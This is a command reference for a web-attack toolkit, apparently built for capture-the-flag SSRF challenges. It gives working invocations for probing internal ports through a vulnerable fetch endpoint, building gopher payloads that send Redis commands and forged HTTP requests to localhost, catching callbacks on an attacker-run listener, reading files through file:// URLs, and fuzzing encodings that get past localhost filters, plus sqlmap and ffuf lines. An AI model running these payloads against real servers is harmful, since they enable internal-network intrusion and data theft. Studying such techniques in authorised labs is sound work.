# Tooling — the repo commands, verified

Every flag below was read off the tool's own `--help`/argparse —
no invented flags. Each emits the shape `hooks.py` wants.

---

## 1. `ssrf_probe.py` — the internal-port oracle

```bash
python3 tools/web/ssrf_probe.py --help
# --url       the endpoint that fetches
# --param     the field carrying the url (form-field name)
# --body      an explicit body-template (overrides --param)
# --method    GET|POST
# --ports     comma-list — the sweep — bounded
# --headers   extra-headers — the fetch-context
# --timeout   per-request bound
# --selftest  offline check
```

```bash
# the loopback port-map — the internal service-inventory
python3 tools/web/ssrf_probe.py \
  --url "$BASE/fetch" --param url --method POST \
  --ports 22,80,3000,5000,6379,8000,8080,8500,9200,11211,2375,2379 \
  --timeout 4
# → one row per port: status / length / elapsed — open ports stand
#   out by length+elapsed
```

The output-table is the oracle: a port answering in ms vs the
timeout-ports in seconds — the open-vs-closed split.

## 2. `gopher_gen.py` — the raw-TCP composer

```bash
python3 tools/web/gopher_gen.py --help
# subcommands: redis | resp | raw | http
# redis   — build a redis-command's gopher-url (RESP-framed)
# resp    — arbitrary RESP frame — multi-command
# raw     — hex-bytes → gopher-url
# http    — an http-request → gopher-url (header-control!)
```

```bash
# the flag-key read
python3 tools/web/gopher_gen.py redis --cmd \
  "EVAL 'return redis.call(\"get\",\"flag\")' 0"
# → gopher://127.0.0.1:6379/_EVAL%20%27return%20redis.call…%0D%0AQUIT%0D%0A

# a full http-request through gopher — the header-control path
python3 tools/web/gopher_gen.py http --host 127.0.0.1 --path /admin \
  --header "X-Forwarded-For: 127.0.0.1"
# → gopher://…_GET%20/admin%20HTTP/1.1%0d%0aHost:%20…%0d%0a
#   X-Forwarded-For:%20127.0.0.1%0d%0a%0d%0a
```

## 3. `oob_listener.py` — the callback

```bash
python3 tools/web/oob_listener.py --help
# serve   — run the listener
# hits    — dump the recorded hits (JSONL — method/path/headers/body)
# canary  — mint a unique canary-tag per probe
```

```bash
python3 tools/web/oob_listener.py serve --port 9000 &
python3 tools/web/oob_listener.py canary --base http://YOU:9000 --name p3
# → a unique host/url for probe-3 — tag-discipline — unordered
#   fetches don't confuse the ledger
python3 tools/web/oob_listener.py hits
# → the JSONL log — the fetcher's UA, headers, body, source
```

## 4. `http_probe.py` — the response-bound probe

```bash
python3 tools/web/http_probe.py --help
# --challenge       the challenge-name — REQUIRED
# --url / --method / --header / --body
# --evidence-regex  the proving-pattern
# --evidence-kind   surface|class|impact
# --on-match/--on-miss  the verdict-map
# emits the full post-probe command with --response filled in
```

```bash
python3 tools/web/http_probe.py --challenge $C --class web-ssrf \
  --url "$BASE/fetch" --method POST --body 'url=http://127.0.0.1:1/' \
  --evidence-regex 'refused|ECONNREFUSED|:1\b' \
  --evidence-kind class --on-match confirms --on-miss inconclusive
# → runs the fetch → if the refused-error matches → emits the
#   full post-probe command — paste it to hooks.py — the response
#   is bound — no retyping
```

## 5. `read_loop.py` — the file-path walk

```bash
python3 tools/web/read_loop.py --help
# --url / --method / --body / --header / --field — the request
# walks a wordlist through a PROVEN file-read channel —
# baseline-classifies each result
```

```bash
# after file:// is proven — walk the flag-paths
python3 tools/web/read_loop.py --url "$BASE/fetch" --method POST \
  --body 'url=file://{path}' --profile flags
# the {path}-marker — the per-iteration substitution point;
# --profile flags walks the built-in flag-path wordlist,
# --path /x reads exactly one, --wordlist file walks your own
```

## 6. `sanitizer_fuzz.py` — the encoding-differential

```bash
python3 tools/web/sanitizer_fuzz.py --help
# --forbidden   the blocked-token (e.g. "127" or "crlf")
# --callable    the working-token
# --diff        the compare-target
# --url/--template/--method/--header/--field — the request-shape
# --urlencode / --families / --nest / --max-cases
# --check-decoded / --max-report / --count-only / --selftest
```

```bash
# which encodings of "127" survive the url-filter?
python3 tools/web/sanitizer_fuzz.py \
  --url "$BASE/fetch" --field url \
  --forbidden '127' --callable '2130706433' \
  --families url-encode,double-encode,hex,octal,unicode \
  --max-cases 40
# → which encoding-forms pass the filter — the bypass-map
```

## 7. `id_sweep.py` — the numeric-enumeration

```bash
# an id-oracle — e.g. internal-routes answering by-id —
# the sweep-classifier marks exists-vs-not
python3 tools/web/id_sweep.py --help
```

## 8. The field tools — when repo-tools don't fit

```bash
curl -s 'http://target/fetch' -d 'url=http://127.0.0.1:1/'   — direct
sqlmap -u 'http://target/fetch' --data 'url=x' --ssrf?        — sqlmap
    doesn't do ssrf — but the url-field is an injection-point —
    sqlmap's job is SQLi — the url-field may be BOTH
ffuf -u http://target/fetch -d 'url=FUZZ' -w ports.txt         — fuzz-
                                                                the
                                                                port-
                                                                wordlist
```

## 9. The tool-decision table

| Situation | Tool |
|---|---|
| prove the fetch | `oob_listener` canary + `http_probe` |
| map internal ports | `ssrf_probe --ports` |
| gopher-payload | `gopher_gen` (redis/resp/raw/http) |
| file-read paths | `read_loop` over the flag-wordlist |
| which-encoding-passes | `sanitizer_fuzz` |
| response-bound verdict | `http_probe --evidence-*` |
| the url-param is a query too | sqlmap for the sqli-side |
| deferred/bot fetch | `oob_listener` — the callback IS the channel |

## 10. The provenance rule

Every probe's response must bind to the claim — `http_probe`
emits the `--response` already — hand-copied excerpts get retyped
— retyped evidence fails the substring-check — use the tool or
capture the response byte-for-byte.
